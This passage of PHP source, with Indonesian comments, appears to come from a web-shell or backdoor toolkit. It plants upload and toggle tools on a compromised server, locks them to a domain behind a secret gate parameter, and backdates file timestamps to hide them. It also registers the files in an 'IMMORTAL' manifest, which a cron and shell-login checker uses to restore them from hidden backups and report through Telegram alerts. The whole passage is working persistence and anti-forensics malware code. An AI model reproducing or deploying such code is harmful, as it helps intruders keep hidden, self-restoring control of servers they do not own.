        if (@file_put_contents($inf[2], $arm) !== false) { @chmod($inf[2], 0600); gsp_stealth_age($inf[2]); }
        $st[$tn] = $picked;
        $st['_md5'][$tn] = $m5;
        $res[$tn] = array('path' => $picked, 'md5' => $m5, 'bak' => $inf[2], 'url' => $url);
        $log[] = '[OK] ' . $tn . ' ter-armor v3 di ' . $picked . ' (' . strlen($arm) . ' byte, chmod 444, domain-lock ' . ($domain !== '' ? $domain : '?') . ')';
        if ($url !== '') $log[] = '     akses: ' . $url . ($pcode > 0 ? ' (HTTP ' . $pcode . ' — TERVERIFIKASI TEMBUS)' : ' (belum terverifikasi)');
    }
    $st['_gate'] = array('param' => $gp, 'secret' => $gs, 'domain' => $domain);
    gsfu_tools_save($st);
    if (count($res) > 0) {
        if (!is_array(gsp_imm_load())) {
            $log[] = '[i] IMMORTAL belum ARM — auto-ARM supaya drop tools dijaga checker...';
            foreach (gsp_imm_arm() as $al) $log[] = '    ' . $al;
        }
        $ent = array();
        foreach (array('rusak_toggle.php', 'upload.php') as $tn) {
            if (isset($res[$tn])) $ent[] = array('path' => $res[$tn]['path'], 'md5' => $res[$tn]['md5'], 'bak' => $res[$tn]['bak']);
        }
        if (gsp_imm_dtools_register($ent)) $log[] = '[+] dtools terdaftar di manifest IMMORTAL — checker memulihkan file hilang/korup/perm bukan 444 dari backup (alert Telegram DTREP)';
        else $log[] = '[!] pendaftaran dtools ke manifest GAGAL';
    }
    /* lock SENGAJA tidak dihapus — kedaluwarsa alami 5 mnt. Proses checker
       yang terlanjur terpicu sesaat sebelum/selama drop (rc hook bash -l)
       masih memakai script lama (path lama); lock segar membuatnya skip
       sehingga tidak ada zombie. Checker cron berikutnya membaca script baru
       (path baru) setelah lock basi. */
    return array($log, $res);
}

/* daftarkan drop tools ke manifest IMMORTAL sebagai dtools[] (path, md5,
   bak) + tulis ulang checker supaya loop penjaga terbaru tertanam.
   Field dtools ikut hash manifest; auto-ARM bila belum ARMED. */
function gsp_imm_dtools_register($entries) {
    if (!is_array($entries)) $entries = array();
    $m = gsp_imm_load();
    if (!is_array($m)) {
        gsp_imm_arm();
        $m = gsp_imm_load();
    }
    if (!is_array($m)) return false;
    $m['dtools'] = array_values($entries);
    $m['hash'] = gsp_imm_hash($m);
    if (!gsp_imm_save($m)) return false;
    if (@file_put_contents($m['checker'], gsp_imm_checker_src($m)) !== false) {
        @chmod($m['checker'], 0700);
        gsp_stealth_age($m['checker']);
    }
    return true;
}
/* cabut 1 drop tool dari manifest (dipakai [hapus]) + buang backup-nya */
function gsp_imm_dtools_unregister($path) {
    $m = gsp_imm_load();
    if (!is_array($m) || !isset($m['dtools']) || !is_array($m['dtools'])) return false;
    $nd = array();
    $hit = false;
    foreach ($m['dtools'] as $e) {
        if (isset($e['path']) && $e['path'] === $path) {
            $hit = true;
            if (isset($e['bak']) && $e['bak'] !== '') @unlink($e['bak']);
            continue;
        }
        $nd[] = $e;
    }
    if (!$hit) return false;
    $m['dtools'] = $nd;
    $m['hash'] = gsp_imm_hash($m);
    gsp_imm_save($m);
    if (@file_put_contents($m['checker'], gsp_imm_checker_src($m)) !== false) {
        @chmod($m['checker'], 0700);
        gsp_stealth_age($m['checker']);
    }
    return true;
}

